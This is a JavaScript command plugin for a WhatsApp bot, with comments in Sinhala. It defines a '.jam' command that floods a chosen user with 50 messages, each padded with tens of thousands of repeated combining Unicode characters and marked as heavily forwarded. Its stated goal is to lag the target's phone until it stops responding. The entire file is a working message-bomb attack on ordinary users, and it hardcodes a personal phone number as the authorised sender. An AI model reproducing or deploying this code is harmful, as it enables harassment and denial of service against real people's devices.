const { cmd } = require('../command');

cmd({
    pattern: "jam",
    alias: ["hang", "slow"],
    desc: "Jam target WhatsApp and block outgoing messages",
    category: "owner",
    react: "⏳",
    filename: __filename
},
async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
    try {
        // අවසර ලත් අංක පමණක් (ඔයා කලින් දුන්නු අංක ටික මෙතනට දාන්න)
        const authorizedNumbers = ['94740137623']; 
        if (!authorizedNumbers.includes(senderNumber) && !isOwner) return reply("අවසර නැහැ! ❌");

        if (!args[0] && !m.quoted) return reply("කරුණාකර අංකයක් දෙන්න හෝ මැසේජ් එකකට reply කරලා .jam ගහන්න.");

        let target = m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        reply("🚀 Jamming Process Started... Target will experience lag.");

        // 1. මේ ලූප් එකෙන් වෙන්නේ අතිශය බර වැඩි Payload එකක් දිගටම යවන එක
        // මේක නිසා එයාගේ ෆෝන් එකේ ඩේටා හුවමාරුව (Processing) හිර වෙනවා.
        for (let i = 0; i < 50; i++) {
            const jammerPayload = " \u0345\u0361\u0345\u1160\u1160".repeat(8000) + "҉".repeat(1000);
            
            await conn.sendMessage(target, { 
                text: jammerPayload,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true
                }
            });
            
            // පොඩි ඩිලේ එකක් දානවා බොට්ට කෙලවෙන්නෙ නැති වෙන්න
            await new Promise(resolve => setTimeout(resolve, 500)); 
        }

        reply("✅ Jamming Finished. Target device should be unresponsive now.");

    } catch (e) {
        console.error(e);
    }
});
